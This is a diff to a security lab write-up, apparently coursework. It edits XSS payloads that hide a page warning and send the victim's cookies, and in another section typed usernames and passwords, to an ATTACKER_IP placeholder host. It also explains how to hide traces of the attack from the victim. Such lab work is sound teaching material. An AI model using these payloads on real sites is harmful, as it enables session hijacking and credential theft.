@@ -9,12 +9,12 @@ The payload for the exercise consists from several parts:
     function theDomHasLoaded(e) { 
     document.getElementsByClassName("warning")[0].style.visibility = 'hidden'; // this hides the red warning message from the page
     } 
-    new Image().src = 'http://example.com/steal.php?cookies=' + encodeURIComponent(document.cookie); //this is the payload to steal the victims cookie
+    new Image().src = 'http://ATTACKER_IP/?cookie=' + encodeURIComponent(document.cookie); //this is the payload to steal the victims cookie
     </script>
 
-The payload also requires that we include ""> and </ in the beginning and the end so that the exploit works properly.
+The payload also requires that we include ""> in the beginning of the payload and </ at the end so that the exploit works properly and hides any extraneous text from the page that would tip the victim about on ongoing attack.
 
-    ""><script>document.addEventListener("DOMContentLoaded", theDomHasLoaded, false);function theDomHasLoaded(e) { document.getElementsByClassName("warning")[0].style.visibility = 'hidden';} new Image().src = 'http://example.com/steal.php?cookies=' + encodeURIComponent(document.cookie);</script></
+    ""><script>document.addEventListener("DOMContentLoaded", theDomHasLoaded, false);function theDomHasLoaded(e) { document.getElementsByClassName("warning")[0].style.visibility = 'hidden';} new Image().src = 'http://ATTACKER_IP/?cookie=' + encodeURIComponent(document.cookie);</script></
     
 Finally, the payload needs to be URL encoded. The attack URL can be found from the following file: [answer-1.txt] (https://github.com/ukk1/ITKST53/blob/master/Lab5/answer-1.txt)
 
@@ -61,7 +61,7 @@ For intercepting the users credentials following modifications were done to the 
         function intercept() {
 		var username = document.forms[0].elements[0].value;
 		var password = document.forms[0].elements[1].value;
-		new Image().src = "http://localhost:8888/?username="+username+"&password="+password;
+		new Image().src = "http://ATTACKER_IP:8888/?username="+username+"&password="+password;
 	}
 	</script>
 	
